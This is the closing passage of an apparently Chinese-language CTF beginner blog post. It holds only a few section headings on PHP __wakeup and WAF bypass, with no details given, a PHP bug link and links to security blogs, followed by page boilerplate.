<p>绕过wakeup new：<br><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a><br>WAF绕过:</p>
<hr>
<p><strong>获得IP的一些请求头</strong></p>
<h2 id="12-大佬博客"><a href="#12-大佬博客" class="headerlink" title="12.大佬博客"></a>12.大佬博客</h2><p><a target="_blank" rel="noopener" href="https://drun1baby.github.io/">https://drun1baby.github.io/</a><br><a target="_blank" rel="noopener" href="https://5ime.cn/h1ve.html">https://5ime.cn/h1ve.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/index.php/category/ctf/">https://blog.zgsec.cn/index.php/category/ctf/</a><br><a target="_blank" rel="noopener" href="https://github.com/SecWiki/sec-chart">https://github.com/SecWiki/sec-chart</a></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/入门/" class="tag">#入门</a><a href="/tags/新人同学/" class="tag">#新人同学</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AB/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">不要捉弄我新人同学: B</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E8%81%94%E7%BA%A7-Boogipop/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">记一次五层内网穿透</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>